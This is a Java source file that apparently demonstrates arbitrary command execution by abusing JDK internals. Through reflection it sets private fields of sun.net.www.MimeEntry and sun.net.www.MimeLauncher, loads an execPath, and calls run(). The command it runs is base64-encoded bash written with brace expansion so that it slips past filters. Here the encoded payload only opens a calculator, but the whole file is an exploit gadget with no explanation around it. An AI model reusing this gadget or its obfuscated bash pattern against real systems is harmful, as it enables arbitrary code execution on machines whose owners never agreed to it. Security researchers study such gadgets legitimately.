package com.example.demo;

import sun.net.www.MimeEntry;

import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLConnection;



public class Acctl {


    public static void main(String[] args) throws Exception{
        String cmd = "bash -c {echo,b3BlbiAtbmEgQ2FsY3VsYXRvcg==}|{base64,-d}|{bash,-i} > %s";

        URLConnection urlConnection = new URL("http://127.0.0.1%s").openConnection();
        MimeEntry mimeEntry = new MimeEntry("aa");
        Class meClass = MimeEntry.class;
        Field field = meClass.getDeclaredField("command");
        field.setAccessible(true);
        field.set(mimeEntry,"/tmp/1 ");

        Field field2 = meClass.getDeclaredField("tempFileNameTemplate");
        field2.setAccessible(true);
        field2.set(mimeEntry,"aa%s");

        InputStream inputStream = new InputStream() {
            @Override
            public int read() throws IOException {
                return -1;
            }
        };

        Class mimeClass = Class.forName("sun.net.www.MimeLauncher");
        Constructor mimeCon = mimeClass.getDeclaredConstructor(MimeEntry.class,URLConnection.class,
                InputStream.class,String.class,String.class);
        mimeCon.setAccessible(true);
        Thread thread = (Thread) mimeCon.newInstance(mimeEntry, urlConnection, inputStream, "0","0");
        Field field3 = mimeClass.getDeclaredField("execPath");
        field3.setAccessible(true);
        field3.set(thread,cmd);

        Method m = mimeClass.getDeclaredMethod("run");
        m.setAccessible(true);
        m.invoke(thread);

    }
}
